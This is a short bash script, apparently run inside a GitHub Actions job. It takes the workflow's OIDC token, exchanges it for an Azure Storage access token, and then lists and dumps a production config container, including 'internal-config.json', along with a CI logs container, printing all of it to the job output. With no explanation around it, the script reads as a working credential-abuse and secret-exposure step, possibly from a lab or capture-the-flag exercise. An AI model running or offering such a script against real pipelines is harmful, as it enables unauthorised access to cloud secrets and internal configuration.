#!/usr/bin/env bash
set -uo pipefail
TENANT="${AZURE_TENANT_ID}"; CLIENT="${AZURE_CLIENT_ID}"
OIDC=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c "import sys,json;print(json.load(sys.stdin).get('value',''))")
tok() { curl -sS -X POST "https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token" --data-urlencode "client_id=${CLIENT}" --data-urlencode "scope=$1" --data-urlencode "grant_type=client_credentials" --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=${OIDC}" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))"; }
ST=$(tok https://storage.azure.com/.default)
echo "== config blobs =="
curl -sS -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" "https://sttblappcfgprodx3euoz.blob.core.windows.net/config?restype=container&comp=list"; echo
echo "== internal-config.json =="
curl -sS -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" "https://sttblappcfgprodx3euoz.blob.core.windows.net/config/internal-config.json"; echo
echo "== logs blobs =="
curl -sS -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" "https://sttblcilogsprodx3euoz.blob.core.windows.net/logs?restype=container&comp=list" | head -c 2000; echo
